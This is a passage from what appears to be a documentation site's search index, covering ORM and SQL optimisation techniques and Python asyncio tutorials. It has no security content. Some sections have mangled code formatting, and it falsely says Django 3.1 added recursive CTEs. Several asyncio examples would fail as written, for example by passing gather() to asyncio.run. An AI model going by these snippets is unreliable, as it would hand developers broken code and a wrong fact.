your_model;\n</code></pre>"},{"location":"programming/orm_sql/#10-raw-sql-in-orm","title":"10. Raw SQL in ORM","text":""},{"location":"programming/orm_sql/#django-orm_9","title":"Django ORM:","text":"<pre><code>YourModel.objects.raw('SELECT * FROM your_model WHERE field1 = %s', ['value1'])\n</code></pre>"},{"location":"programming/orm_sql/#sqlalchemy_9","title":"SQLAlchemy:","text":"<pre><code>session.query(YourModel).from_statement(\"SELECT * FROM your_model WHERE field1 = :value\").params(value=\"value1\")\n</code></pre>"},{"location":"programming/orm_sql/#raw-sql_9","title":"Raw SQL:","text":"<pre><code>SELECT * FROM your_model WHERE field1 = 'value1';\n</code></pre>"},{"location":"programming/orm_sql/#advanced-orm-optimization-techniques-django-sqlalchemy-raw-sql","title":"Advanced ORM Optimization Techniques: Django, SQLAlchemy &amp; Raw SQL","text":""},{"location":"programming/orm_sql/#1-avoiding-n1-queries-problem","title":"1. Avoiding <code>n+1</code> Queries Problem","text":""},{"location":"programming/orm_sql/#django-orm_10","title":"Django ORM:","text":"<pre><code># Using select_related for ForeignKey and OneToOneField relations\nYourModel.objects.select_related('related_model').all()\n\n# Using prefetch_related for ManyToManyField and reverse ForeignKey relations\nYourModel.objects.prefetch_related('related_model_set').all()\n</code></pre>"},{"location":"programming/orm_sql/#sqlalchemy_10","title":"SQLAlchemy:","text":"<pre><code># Using joinedload for JOINed loading\nfrom sqlalchemy.orm import joinedload\nsession.query(YourModel).options(joinedload(YourModel.related_model))\n</code></pre>"},{"location":"programming/orm_sql/#raw-sql_10","title":"Raw SQL:","text":"<pre><code>SELECT * FROM your_model \nJOIN related_model ON your_model.related_id = related_model.id;\n</code></pre>"},{"location":"programming/orm_sql/#2-only-fetch-what-you-need","title":"2. Only Fetch What You Need","text":""},{"location":"programming/orm_sql/#django-orm_11","title":"Django ORM:","text":"<pre><code>YourModel.objects.only('field1', 'field2')\n</code></pre>"},{"location":"programming/orm_sql/#sqlalchemy_11","title":"SQLAlchemy:","text":"<pre><code>session.query(YourModel.field1, YourModel.field2)\n</code></pre>"},{"location":"programming/orm_sql/#raw-sql_11","title":"Raw SQL:","text":"<pre><code>SELECT field1, field2 FROM your_model;\n</code></pre>"},{"location":"programming/orm_sql/#3-using-database-indexes","title":"3. Using Database Indexes","text":""},{"location":"programming/orm_sql/#django-orm_12","title":"Django ORM:","text":"<pre><code># When defining the model, use db_index=True\nclass YourModel(models.Model):\n    field1 = models.CharField(max_length=100, db_index=True)\n</code></pre>"},{"location":"programming/orm_sql/#sqlalchemy_12","title":"SQLAlchemy:","text":"<pre><code># Define the index within the table\nfrom sqlalchemy import Index, create_engine, MetaData\n\nmeta = MetaData()\nyour_table = Table('your_model', meta,\n    Column('field1', String, index=True)\n)\n</code></pre>"},{"location":"programming/orm_sql/#raw-sql_12","title":"Raw SQL:","text":"<pre><code>CREATE INDEX index_name ON your_model (field1);\n</code></pre>"},{"location":"programming/orm_sql/#4-batch-inserts","title":"4. Batch Inserts","text":""},{"location":"programming/orm_sql/#django-orm_13","title":"Django ORM:","text":"<pre><code># Using bulk_create\nYourModel.objects.bulk_create([YourModel(field1=value) for value in value_list])\n</code></pre>"},{"location":"programming/orm_sql/#sqlalchemy_13","title":"SQLAlchemy:","text":"<pre><code>session.bulk_insert_mappings(YourModel, [{'field1': value} for value in value_list])\n</code></pre>"},{"location":"programming/orm_sql/#raw-sql_13","title":"Raw SQL:","text":"<pre><code>INSERT INTO your_model (field1) VALUES (value1), (value2), ...;\n</code></pre>"},{"location":"programming/orm_sql/#5-optimizing-count-queries","title":"5. Optimizing Count Queries","text":""},{"location":"programming/orm_sql/#django-orm_14","title":"Django ORM:","text":"<pre><code>YourModel.objects.filter(some_criteria=True).count()\n</code></pre>"},{"location":"programming/orm_sql/#sqlalchemy_14","title":"SQLAlchemy:","text":"<pre><code>session.query(func.count(YourModel.id)).filter(YourModel.some_criteria == True)\n</code></pre>"},{"location":"programming/orm_sql/#raw-sql_14","title":"Raw SQL:","text":"<pre><code>SELECT COUNT(id) FROM your_model WHERE some_criteria = TRUE;\n</code></pre>"},{"location":"programming/orm_sql/#6-use-exists-for-presence-checks","title":"6. Use EXISTS for Presence Checks","text":""},{"location":"programming/orm_sql/#django-orm_15","title":"Django ORM:","text":"<pre><code>if YourModel.objects.filter(field1=value).exists():\n    # Do something\n</code></pre>"},{"location":"programming/orm_sql/#sqlalchemy_15","title":"SQLAlchemy:","text":"<pre><code>if session.query(YourModel).filter(YourModel.field1 == value).limit(1).first():\n    # Do something\n</code></pre>"},{"location":"programming/orm_sql/#raw-sql_15","title":"Raw SQL:","text":"<pre><code>SELECT EXISTS(SELECT 1 FROM your_model WHERE field1 = value);\n</code></pre>"},{"location":"programming/orm_sql/#7-use-database-functions-for-computation","title":"7. Use Database Functions for Computation","text":""},{"location":"programming/orm_sql/#django-orm_16","title":"Django ORM:","text":"<pre><code>from django.db.models.functions import Coalesce\nYourModel.objects.update(field2=Coalesce('field2', 0) + 1)\n</code></pre>"},{"location":"programming/orm_sql/#sqlalchemy_16","title":"SQLAlchemy:","text":"<pre><code>from sqlalchemy.sql.expression import func\nsession.query(YourModel).update({YourModel.field2: func.coalesce(YourModel.field2, 0) + 1})\n</code></pre>"},{"location":"programming/orm_sql/#raw-sql_16","title":"Raw SQL:","text":"<pre><code>UPDATE your_model SET field2 = COALESCE(field2, 0) + 1;\n</code></pre>"},{"location":"programming/orm_sql/#8-avoiding-orm-overhead-for-large-data-sets","title":"8. Avoiding ORM Overhead for Large Data Sets","text":""},{"location":"programming/orm_sql/#django-orm_17","title":"Django ORM:","text":"<pre><code>YourModel.objects.values('field1', 'field2')\n</code></pre>"},{"location":"programming/orm_sql/#sqlalchemy_17","title":"SQLAlchemy:","text":"<pre><code>session.query(YourModel.field1, YourModel.field2).yield_per(1000)\n</code></pre>"},{"location":"programming/orm_sql/#raw-sql_17","title":"Raw SQL:","text":"<pre><code>SELECT field1, field2 FROM your_model;\n</code></pre>"},{"location":"programming/orm_sql/#9-de-normalization-for-faster-reads","title":"9. De-normalization for Faster Reads","text":""},{"location":"programming/orm_sql/#django-orm_18","title":"Django ORM:","text":"<pre><code># Using annotated fields or computed properties\nclass YourModel(models.Model):\n    field1 = models.IntegerField()\n    field2 = models.IntegerField()\n    total = models.IntegerField(editable=False)\n\n    def save(self, *args, **kwargs):\n        self.total = self.field1 + self.field2\n        super().save(*args, **kwargs)\n</code></pre>"},{"location":"programming/orm_sql/#sqlalchemy_18","title":"SQLAlchemy:","text":"<pre><code>from sqlalchemy import Column, Integer, event\n\nclass YourModel(Base):\n    __tablename__ = 'your_model'\n\n    id = Column(Integer, primary_key=True)\n    field1 = Column(Integer)\n    field2 = Column(Integer)\n    total = Column(Integer)\n\n@event.listens_for(YourModel, 'before_insert')\ndef before_insert(mapper, connection, target):\n    target.total = target.field1 + target.field2\n</code></pre>"},{"location":"programming/orm_sql/#raw-sql_18","title":"Raw SQL:","text":"<pre><code>-- Assuming the total column is already added to your_model\nUPDATE your_model SET total = field1 + field2;\n</code></pre>"},{"location":"programming/orm_sql/#10-caching-expensive-queries","title":"10. Caching Expensive Queries","text":""},{"location":"programming/orm_sql/#django-orm_19","title":"Django ORM:","text":"<pre><code># Using Django's cache framework\nfrom django.core.cache import cache\n\nkey = \"your_cache_key\"\ndata = cache.get(key)\n\nif data is None:\n    data = YourModel.objects.filter(some_criteria=True)\n    cache.set(key, data)\n</code></pre>"},{"location":"programming/orm_sql/#sqlalchemy_19","title":"SQLAlchemy:","text":"<pre><code># Using dogpile.cache for SQLAlchemy\nfrom dogpile.cache import make_region\n\nregion = make_region().configure('dogpile.cache.memory', expiration_time=3600)\nkey = \"your_cache_key\"\ndata = region.get(key)\n\nif data is None:\n    data = session.query(YourModel).filter(YourModel.some_criteria == True).all()\n    region.set(key, data)\n</code></pre>"},{"location":"programming/orm_sql/#raw-sql_19","title":"Raw SQL:","text":"<pre><code>-- This varies by the database and specific caching solutions. Typically, databases have their internal caching mechanisms for frequent queries.\n\n# Deep Dive into Advanced ORM Techniques: Django, SQLAlchemy &amp; Raw SQL\n\n## 11. Composite Primary Keys\n\n### Django ORM:\n</code></pre>"},{"location":"programming/orm_sql/#django-does-not-natively-support-composite-primary-keys-however-you-can-use-a-unique-constraint","title":"Django does not natively support composite primary keys. However, you can use a unique constraint.","text":"<p>class YourModel(models.Model):     field1 = models.IntegerField()     field2 = models.IntegerField()</p> <pre><code>class Meta:\n    constraints = [\n        models.UniqueConstraint(fields=['field1', 'field2'], name='unique_field1_field2')\n    ]\n</code></pre> <p>``` </p>"},{"location":"programming/orm_sql/#sqlalchemy_20","title":"SQLAlchemy:","text":"<p>``` from sqlalchemy import Column, Integer, PrimaryKeyConstraint</p> <p>class YourModel(Base):     tablename = 'your_model'</p> <pre><code>field1 = Column(Integer)\nfield2 = Column(Integer)\n\n__table_args__ = (\n    PrimaryKeyConstraint('field1', 'field2'),\n)\n</code></pre> <p>``` </p>"},{"location":"programming/orm_sql/#raw-sql_20","title":"Raw SQL:","text":"<p><code>CREATE TABLE your_model (     field1 INT,     field2 INT,     PRIMARY KEY (field1, field2) );</code> </p>"},{"location":"programming/orm_sql/#12-using-views","title":"12. Using Views","text":""},{"location":"programming/orm_sql/#django-orm_20","title":"Django ORM:","text":"<p>```</p>"},{"location":"programming/orm_sql/#create-a-view-in-your-database-then-create-a-model-mapped-to-this-view-ensure-db_table-points-to-the-view","title":"Create a view in your database, then create a model mapped to this view. Ensure db_table points to the view.","text":"<p>class YourViewModel(models.Model):     field1 = models.IntegerField()     field2 = models.IntegerField()</p> <pre><code>class Meta:\n    managed = False  # Django will not manage this table\n    db_table = 'your_view'\n</code></pre> <p>``` </p>"},{"location":"programming/orm_sql/#sqlalchemy_21","title":"SQLAlchemy:","text":"<p>```</p>"},{"location":"programming/orm_sql/#map-the-model-to-an-existing-view","title":"Map the model to an existing view.","text":"<p>class YourViewModel(Base):     tablename = 'your_view'     field1 = Column(Integer, primary_key=True)     field2 = Column(Integer) ``` </p>"},{"location":"programming/orm_sql/#raw-sql_21","title":"Raw SQL:","text":"<p><code>CREATE VIEW your_view AS SELECT field1, field2 FROM your_model WHERE some_criteria = TRUE;</code> </p>"},{"location":"programming/orm_sql/#13-temporary-tables","title":"13. Temporary Tables","text":""},{"location":"programming/orm_sql/#django-orm_21","title":"Django ORM:","text":"<p>```</p>"},{"location":"programming/orm_sql/#django-orm-doesnt-have-built-in-support-for-temporary-tables-youd-typically-create-them-using-raw-sql","title":"Django ORM doesn't have built-in support for temporary tables. You'd typically create them using raw SQL.","text":"<p>from django.db import connection</p> <p>with connection.cursor() as cursor:     cursor.execute('''         CREATE TEMPORARY TABLE temp_your_model AS         SELECT * FROM your_model WHERE some_criteria = TRUE;     ''') <pre><code>### SQLAlchemy:\n</code></pre></p>"},{"location":"programming/orm_sql/#use-the-standard-table-creation-but-specify-it-as-a-temporary-table","title":"Use the standard table creation but specify it as a temporary table.","text":"<p>temp_table = Table(     \"temp_your_model\", metadata,     Column('field1', Integer),     # Add other columns...     prefixes=['TEMPORARY'] ) temp_table.create(bind=engine) <pre><code>### Raw SQL:\n</code></pre> CREATE TEMPORARY TABLE temp_your_model AS SELECT * FROM your_model WHERE some_criteria = TRUE; <pre><code>## 14. Recursive Queries (Common Table Expressions)\n\n### Django ORM:\n</code></pre></p>"},{"location":"programming/orm_sql/#django-31-introduced-support-for-recursive-ctes","title":"Django 3.1 introduced support for recursive CTEs","text":"<p>from django_cte import CTEManager, CTEQuerySet</p> <p>class YourModel(models.Model):     parent = models.ForeignKey('self', null=True, on_delete=models.CASCADE)     name = models.CharField(max_length=200)</p> <pre><code>objects = CTEManager.from_queryset(CTEQuerySet)()\n</code></pre> <p>with YourModel.objects.with_cte(recursive=True) as cte:     cte_qs = cte.queryset.annotate(level=models.Value(0)).filter(name=\"root_name\")     children_qs = cte.queryset.filter(parent=cte.join()).annotate(level=cte.col.level + 1)     cte.union(cte_qs, children_qs)     results = cte.all() <pre><code>### SQLAlchemy:\n</code></pre> from sqlalchemy import select, union_all from sqlalchemy.orm import aliased</p> <p>descendants = select([     YourModel.id, YourModel.parent_id, YourModel.name ]).where(YourModel.name == 'root_name').cte(name='descendants', recursive=True)</p> <p>parent_alias = aliased(descendants) children = select([     YourModel.id, YourModel.parent_id, YourModel.name ]).join(     parent_alias, parent_alias.c.id == YourModel.parent_id )</p> <p>descendants = descendants.union_all(children) session.query(descendants).all() <pre><code>### Raw SQL:\n</code></pre> WITH RECURSIVE descendants AS (     SELECT id, parent_id, name     FROM your_model WHERE name = 'root_name'</p> <pre><code>UNION ALL\n\nSELECT m.id, m.parent_id, m.name\nFROM your_model m\nJOIN descendants d ON d.id = m.parent_id\n</code></pre> <p>) SELECT * FROM descendants; ``` </p>"},{"location":"programming/orm_sql/#15-upserts-insert-or-update","title":"15. Upserts (Insert or Update)","text":""},{"location":"programming/orm_sql/#django-orm_22","title":"Django ORM:","text":"<p>``` from django.db import IntegrityError</p> <p>try:     YourModel.objects.create(id=some_id, field1=value1) except IntegrityError:     YourModel.objects.filter(id=some_id).update(field1=value1) <pre><code>### SQLAlchemy:\n</code></pre> from sqlalchemy.dialects.postgresql import insert</p> <p>stmt = insert(YourModel).values(id=some_id, field1=value1) stmt = stmt.on_conflict_do_update(     index_elements=['id'],     set_=dict(field1=value1) ) session.execute(stmt) <pre><code>### Raw SQL:\n</code></pre> INSERT INTO your_model (id, field1) VALUES (some_id, 'value1') ON CONFLICT (id) DO UPDATE SET field1 = 'value1'; ```</p> <p>These are some deeper techniques and features that can be utilized in ORMs and SQL to optimize, enhance, and leverage powerful database features. Remember that the most suitable technique always depends on the specific problem you're solving, the database you're using, and the scale at which you operate.</p>"},{"location":"python/async/","title":"asyncio","text":""},{"location":"python/async/#1-introduction-to-asynchronous-programming","title":"1. Introduction to Asynchronous Programming","text":"<p>Asynchronous programming is a method that allows for the execution of certain tasks concurrently without blocking the main thread. Instead of waiting for one task to complete before moving on to the next, asynchronous programming allows multiple tasks to run in \"parallel\", making better use of system resources and often speeding up overall execution.</p> <p>Next topic: Traditional Multi-threading vs Asynchronous Programming.</p>"},{"location":"python/async/#2-traditional-multi-threading-vs-asynchronous-programming","title":"2. Traditional Multi-threading vs Asynchronous Programming","text":"<p>In traditional multi-threading, multiple threads run in parallel. Each thread might be executing a different task or function. While this allows for concurrent execution, it also introduces complexity with thread management, synchronization, and potential deadlocks.</p> <p>In contrast, asynchronous programming, especially in Python's context, utilizes a single-threaded event loop. Tasks are executed in this loop but can yield control back to the loop when waiting for some I/O operations, allowing other tasks to run.</p> <p>Advantages of Asynchronous Programming: - Scalability: Asynchronous programs can handle many tasks with a single thread. - Simplicity: Avoids complexities of thread synchronization and deadlocks.</p> <p>Next topic: Python's <code>asyncio</code> Basics.</p>"},{"location":"python/async/#3-pythons-asyncio-basics","title":"3. Python's <code>asyncio</code> Basics","text":""},{"location":"python/async/#31-async-await","title":"3.1. <code>async</code> &amp; <code>await</code>","text":"<p>To mark a function as asynchronous, you use the <code>async</code> keyword before <code>def</code>: <pre><code>async def my_async_function():\n    pass\n</code></pre></p> <p>To call asynchronous functions or to execute asynchronous code inside an async function, you use the <code>await</code> keyword: <pre><code>async def fetch_data():\n    data = await get_data_from_source()\n    return data\n</code></pre></p>"},{"location":"python/async/#32-event-loop","title":"3.2. Event Loop","text":"<p>The event loop is the heart of every asyncio application. It allows you to schedule asynchronous tasks and callbacks, run them, and manage their execution flow.</p> <pre><code>import asyncio\n\nasync def main():\n    print(\"Hello\")\n    await asyncio.sleep(1)\n    print(\"World\")\n\nasyncio.run(main())\n</code></pre>"},{"location":"python/async/#33-tasks-and-coroutines","title":"3.3. Tasks and Coroutines","text":"<p>Tasks are used to schedule coroutines concurrently. A coroutine is a special type of function that can yield control back to the event loop, allowing other coroutines to run.</p> <pre><code>import asyncio\n\nasync def say_hello():\n    await asyncio.sleep(1)\n    print(\"Hello\")\n\nasync def say_world():\n    print(\"World\")\n\nasync def main():\n    task1 = asyncio.create_task(say_hello())\n    task2 = asyncio.create_task(say_world())\n    await task1\n    await task2\n\nasyncio.run(main())\n</code></pre> <p>Next topic: Asynchronous I/O with Python.</p>"},{"location":"python/async/#4-asynchronous-io-with-python","title":"4. Asynchronous I/O with Python","text":"<p>One of the primary uses for asynchronous programming is handling Input/Output (I/O) operations without blocking. I/O-bound tasks, such as network requests or reading and writing to databases, often involve waiting. Asynchronous I/O lets us perform these tasks more efficiently.</p> <p>For instance, when fetching data from multiple URLs, instead of waiting for each request to complete one after another, you can fetch from multiple URLs \"at the same time\".</p> <pre><code>import aiohttp\nimport asyncio\n\nasync def fetch_url(url):\n    async with aiohttp.ClientSession() as session:\n        async with session.get(url) as response:\n            return await response.text()\n\nasync def main():\n    urls = [\"http://example.com\", \"http://example.org\", \"http://example.net\"]\n    tasks = [fetch_url(url) for url in urls]\n    results = await asyncio.gather(*tasks)\n    for url, result in zip(urls, results):\n        print(f\"Data from {url[:30]}: {len(result)} characters\")\n\nasyncio.run(main())\n</code></pre> <p>Next topic: Advanced Techniques in Asynchronous Programming.</p>"},{"location":"python/async/#5-advanced-techniques-in-asynchronous-programming","title":"5. Advanced Techniques in Asynchronous Programming","text":""},{"location":"python/async/#51-managing-multiple-tasks-with-gather-wait","title":"5.1. Managing Multiple Tasks with <code>gather</code> &amp; <code>wait</code>","text":"<p>We've already seen <code>gather</code> in action, which waits for all tasks to complete and returns their results. However, sometimes you might want to proceed as soon as one of the tasks completes, and for that, you can use <code>asyncio.wait</code> with the <code>FIRST_COMPLETED</code> option.</p> <pre><code>import asyncio\n\nasync def task_one():\n    await asyncio.sleep(2)\n    return \"Task One Completed!\"\n\nasync def task_two():\n    await asyncio.sleep(1)\n    return \"Task Two Completed!\"\n\nasync def main():\n    tasks = [task_one(), task_two()]\n    done, pending = await asyncio.wait(tasks, return_when=asyncio.FIRST_COMPLETED)\n\n    for task in done:\n        print(task.result())\n\nasyncio.run(main())\n</code></pre>"},{"location":"python/async/#52-handling-timeouts-and-delays","title":"5.2. Handling Timeouts and Delays","text":"<p>Sometimes you might not want to wait indefinitely for a task to complete. Using <code>asyncio.wait_for</code>, you can set a timeout.</p> <pre><code>import asyncio\n\nasync def long_task():\n    await asyncio.sleep(10)\n\nasync def main():\n    try:\n        await asyncio.wait_for(long_task(), timeout=5)\n    except asyncio.TimeoutError:\n        print(\"Task took too long!\")\n\nasyncio.run(main())\n</code></pre>"},{"location":"python/async/#53-error-handling-in-async-context","title":"5.3. Error Handling in Async Context","text":"<p>Just like with synchronous code, you can use try-except blocks to handle errors in asynchronous functions.</p> <pre><code>import asyncio\n\nasync def risky_task():\n    raise ValueError(\"This is an intentional error!\")\n\nasync def main():\n    try:\n        await risky_task()\n    except ValueError as e:\n        print(f\"Caught an error: {e}\")\n\nasyncio.run(main())\n</code></pre> <p>Next topic: Integration with Other Libraries.</p>"},{"location":"python/async/#6-integration-with-other-libraries","title":"6. Integration with Other Libraries","text":""},{"location":"python/async/#61-aiohttp-for-asynchronous-http-requests","title":"6.1. <code>aiohttp</code> for Asynchronous HTTP Requests","text":"<p>We briefly touched on <code>aiohttp</code> earlier. It's a powerful library that provides asynchronous HTTP client and server functionality. The client lets you make non-blocking requests, while the server allows you to handle incoming requests asynchronously.</p> <p>Example using <code>aiohttp</code> as a server:</p> <pre><code>from aiohttp import web\n\nasync def handle(request):\n    return web.Response(text=\"Hello, world!\")\n\napp = web.Application()\napp.router.add_get('/', handle)\n\nweb.run_app(app)\n</code></pre>"},{"location":"python/async/#62-aiomysql-aiopg-for-asynchronous-database-operations","title":"6.2. <code>aiomysql</code> &amp; <code>aiopg</code> for Asynchronous Database Operations","text":"<p>For database operations, you can use libraries like <code>aiomysql</code> for MySQL and <code>aiopg</code> for PostgreSQL. These libraries provide asynchronous interfaces to interact with databases.</p> <p>Example using <code>aiomysql</code>:</p> <pre><code>import asyncio\nimport aiomysql\n\nasync def main():\n    pool = await aiomysql.create_pool(host='127.0.0.1', port=3306, user='user', password='password', db='testdb')\n\n    async with pool.acquire() as conn:\n        async with conn.cursor() as cur:\n            await cur.execute(\"SELECT some_column FROM some_table;\")\n            print(await cur.fetchone())\n\n    pool.close()\n    await pool.wait_closed()\n\nasyncio.run(main())\n</code></pre> <p>Next topic: Potential Pitfalls and Common Mistakes.</p>"},{"location":"python/async/#7-potential-pitfalls-and-common-mistakes","title":"7. Potential Pitfalls and Common Mistakes","text":"<p>Understanding the potential pitfalls in asynchronous programming can save developers a lot of time and prevent unexpected behaviors.</p>"},{"location":"python/async/#71-mixing-sync-and-async-code","title":"7.1. Mixing Sync and Async Code","text":"<p>One of the common mistakes is mixing synchronous code with asynchronous code without being aware of the consequences. For instance, using a blocking function inside an async function can halt the entire event loop.</p> <pre><code>import asyncio\nimport time\n\nasync def wrong_usage():\n    time.sleep(3)  # This is a blocking call\n    print(\"This will block the entire event loop\")\n\nasyncio.run(wrong_usage())\n</code></pre> <p>Always ensure that you're using non-blocking alternatives inside async functions.</p>"},{"location":"python/async/#72-forgetting-await","title":"7.2. Forgetting <code>await</code>","text":"<p>Another easy mistake is forgetting the <code>await</code> keyword when calling an async function. This results in the function not being executed, and instead, a coroutine object is returned.</p> <pre><code>async def greet():\n    return \"Hello, World!\"\n\nasync def main():\n    greeting = greet()  # Forgot await\n    print(greeting)  # This will print a coroutine object, not the greeting.\n\nasyncio.run(main())\n</code></pre>"},{"location":"python/async/#73-not-handling-exceptions-in-tasks","title":"7.3. Not Handling Exceptions in Tasks","text":"<p>If an exception is raised in a Task and not caught, it won't propagate immediately. Instead, it will propagate when the Task object is garbage collected, which can make debugging tricky.</p> <pre><code>import asyncio\n\nasync def raise_error():\n    raise Exception(\"Intentional Error\")\n\nasync def main():\n    task = asyncio.create_task(raise_error())\n    await asyncio.sleep(1)\n\nasyncio.run(main())\n</code></pre> <p>Always ensure you handle exceptions in your tasks, either within the task or when gathering/waiting for them.</p> <p>Next topic: Best Practices &amp; Recommendations.</p>"},{"location":"python/async/#8-best-practices-recommendations","title":"8. Best Practices &amp; Recommendations","text":"<p>When writing asynchronous code, following best practices can help maintainability, performance, and overall code quality.</p>"},{"location":"python/async/#81-use-async-and-await-consistently","title":"8.1. Use <code>async</code> and <code>await</code> Consistently","text":"<p>Ensure that you're consistently using the <code>async</code> and <code>await</code> keywords appropriately. If a function is asynchronous, mark it with <code>async</code> and ensure that its callers are aware that they're calling an async function.</p>"},{"location":"python/async/#82-favor-high-level-apis","title":"8.2. Favor High-Level APIs","text":"<p>Python's <code>asyncio</code> provides both high-level and low-level APIs. Whenever possible, favor high-level APIs as they are more user-friendly and abstract away a lot of the complexity.</p>"},{"location":"python/async/#83-use-asynchronous-context-managers","title":"8.3. Use Asynchronous Context Managers","text":"<p>Many async libraries provide asynchronous context managers, which help in ensuring that resources are properly managed. </p> <p>For example, with <code>aiohttp</code>, you can use:</p> <pre><code>async with aiohttp.ClientSession() as session:\n    ...\n</code></pre> <p>This ensures that the session is properly closed after usage.</p>"},{"location":"python/async/#84-be-wary-of-thread-safety","title":"8.4. Be Wary of Thread-Safety","text":"<p>Even though asynchronous code in Python usually runs in a single thread, if you integrate with other systems or use thread pools, be aware of thread-safety. Ensure shared resources are accessed in a thread-safe manner.</p> <p>Next topic: Conclusion and Future of Python Async.</p>"},{"location":"python/async/#9-conclusion-and-future-of-python-async","title":"9. Conclusion and Future of Python Async","text":"<p>Asynchronous programming in Python has come a long way, especially with the introduction and continuous development of <code>asyncio</code>. It provides a powerful toolset for writing efficient I/O-bound programs.</p> <p>However, like all tools, it's essential to understand its strengths and limitations, and when to use it. Not all problems are best solved with asynchronicity, and sometimes, traditional multi-threading or even multi-processing can be more appropriate.</p> <p>The future looks bright for async in Python, with continuous enhancements to <code>asyncio</code> and a growing ecosystem of asynchronous libraries. As the community gains more experience and the tooling improves, we can expect even more robust and performant asynchronous applications in Python.</p> <p>End of Topics.</p>"},{"location":"python/async/#10-advanced-queue-operations-with-asyncio","title":"10. Advanced Queue Operations with <code>asyncio</code>","text":"<p><code>asyncio</code> provides a Queue class that is similar to <code>queue.Queue</code> but designed to be used with async functions.</p>"},{"location":"python/async/#101-basic-queue-operations","title":"10.1. Basic Queue Operations","text":"<p>Queues are an essential part of many concurrent programs and can be used to pass messages between different parts of a system.</p> <pre><code>import asyncio\n\nasync def producer(queue):\n    for i in range(5):\n        await queue.put(i)\n        print(f\"Produced {i}\")\n        await asyncio.sleep(1)\n\nasync def consumer(queue):\n    for _ in range(5):\n        item = await queue.get()\n        print(f\"Consumed {item}\")\n\nqueue = asyncio.Queue()\nasyncio.run(asyncio.gather(producer(queue), consumer(queue)))\n</code></pre>"},{"location":"python/async/#102-implementing-producer-consumer-with-asyncio","title":"10.2. Implementing Producer-Consumer with <code>asyncio</code>","text":"<p>The producer-consumer pattern is a classic concurrency pattern where one or more producers add tasks to a queue, and one or more consumers take tasks from the queue and process them.</p> <pre><code>import asyncio\nimport random\n\nasync def producer(queue, name):\n    for _ in range(5):\n        item = random.randint(1, 10)\n        await asyncio.sleep(random.random())\n        await queue.put(item)\n        print(f\"Producer {name} produced {item}\")\n\nasync def consumer(queue, name):\n    while True:\n        await asyncio.sleep(random.random())\n        item = await queue.get()\n        if item is None:  # Sentinel value to exit\n            break\n        print(f\"Consumer {name} consumed {item}\")\n\nqueue = asyncio.Queue()\n\nproducers = [producer(queue, name=i) for i in range(3)]\nconsumers = [consumer(queue, name=i) for i in range(3)]\n\n# Run the producers and consumers\nasyncio.run(asyncio.gather(*producers, *consumers))\n\n# Signal the consumers to exit\nfor _ in range(3):\n    queue.put_nowait(None)\n</code></pre>"},{"location":"python/async/#103-limiting-queue-size","title":"10.3. Limiting Queue Size","text":"<p>For certain applications, you might want to limit the number of items a queue can hold. This can be useful to apply backpressure on the producer when the queue gets full.</p> <pre><code>queue = asyncio.Queue(maxsize=5)\n\nasync def bounded_producer(queue):\n    for i in range(10):\n        print(f\"Producing {i}\")\n        await queue.put(i)\n        print(f\"Produced {i}\")\n        await asyncio.sleep(0.5)\n\nasyncio.run(bounded_producer(queue))\n</code></pre> <p>When the queue reaches its maximum size, <code>queue.put</code> will block until there's room to add another item.</p> <p>Next topic: More Advanced Techniques in Asynchronous Programming.</p>"},{"location":"python/async/#11-more-advanced-techniques-in-asynchronous-programming","title":"11. More Advanced Techniques in Asynchronous Programming","text":""},{"location":"python/async/#111-priority-queues","title":"11.1. Priority Queues","text":"<p>You can use priority queues to ensure that some tasks get priority over others:</p> <pre><code>import asyncio\nimport heapq\n\nclass AsyncPriorityQueue:\n    def __init__(self):\n        self._queue = []\n        self._count = 0\n        self._event = asyncio.Event()\n\n    async def put(self, item, priority):\n        heapq.heappush(self._queue, (priority, self._count, item))\n        self._count += 1\n        self._event.set()\n\n    async def get(self):\n        while not self._queue:\n            self._event.clear()\n            await self._event.wait()\n        priority, count, item = heapq.heappop(self._queue)\n        return item\n</code></pre>"},{"location":"python/async/#112-semaphores-and-locks","title":"11.2. Semaphores and Locks","text":"<p>Semaphores and locks are synchronization primitives that can be used to protect resources:</p> <pre><code>import asyncio\n\nsem = asyncio.Semaphore(10)  # Allows 10 tasks to access a resource at a time\n\nasync def worker(num):\n    async with sem:\n        print(f\"Worker {num} has started\")\n        await asyncio.sleep(1)\n        print(f\"Worker {num} has finished\")\n\nasyncio.run(asyncio.gather(*(worker(i) for i in range(20))))\n</code></pre>"},{"location":"python/async/#113-async-streams","title":"11.3. Async Streams","text":"<p>Async streams allow you to consume or produce multiple values with async iteration:</p> <pre><code>import asyncio\n\nasync def ticker(delay, to):\n    for i in range(to):\n        yield i\n        await asyncio.sleep(delay)\n\nasync def main():\n    async for tick in ticker(1, 5):\n        print(f\"Tick: {tick}\")\n\nasyncio.run(main())\n</code></pre>"},{"location":"python/async/#114-exception-propagation","title":"11.4. Exception Propagation","text":"<p>When working with tasks, handling exceptions is crucial:</p> <pre><code>import asyncio\n\nasync def raise_exception():\n    raise ValueError(\"An error occurred!\")\n\nasync def main():\n    tasks = [raise_exception(), asyncio.sleep(1)]\n    results, _ = await asyncio.wait(tasks, return_when=asyncio.FIRST_EXCEPTION)\n    for task in results:\n        try:\n            task.result()  # Will raise the ValueError\n        except ValueError as e:\n            print(f\"Caught an error: {e}\")\n\nasyncio.run(main())\n</code></pre>"},{"location":"python/async/#115-using-tasks-effectively","title":"11.5. Using Tasks Effectively","text":"<p>While creating tasks is simple, managing their lifecycle and ensuring they complete without hanging your application can be tricky:</p> <pre><code>import asyncio\n\nasync def do_work():\n    await asyncio.sleep(2)\n\nasync def main():\n    task = asyncio.create_task(do_work())\n    await asyncio.sleep(1)\n    print(\"Main work done!\")\n    await task  # Ensure all spawned tasks are awaited\n\nasyncio.run(main())\n</code></pre> <p>Next topic: Combining Async IO with Multiprocessing.</p>"},{"location":"python/async/#12-combining-async-io-with-multiprocessing","title":"12. Combining Async IO with Multiprocessing","text":"<p>While <code>asyncio</code> excels at I/O-bound tasks, it runs in a single thread and doesn't utilize multiple cores for CPU-bound tasks. For these tasks, you can combine <code>asyncio</code> with multiprocessing to achieve parallelism across cores.</p>"},{"location":"python/async/#121-basic-async-with-multiprocessing","title":"12.1. Basic Async with Multiprocessing","text":"<p>Here's a simple demonstration of running CPU-bound tasks in separate processes while using async for I/O:</p> <pre><code>import asyncio\nfrom concurrent.futures import ProcessPoolExecutor\n\ndef cpu_bound_task(data):\n    # Simulating a CPU-bound task by calculating sum\n    return sum(data)\n\nasync def main():\n    data = [range(1000000) for _ in range(4)]\n    with ProcessPoolExecutor() as pool:\n        result = await asyncio.gather(*(loop.run_in_executor(pool, cpu_bound_task, d) for d in data))\n    print(result)\n\nloop = 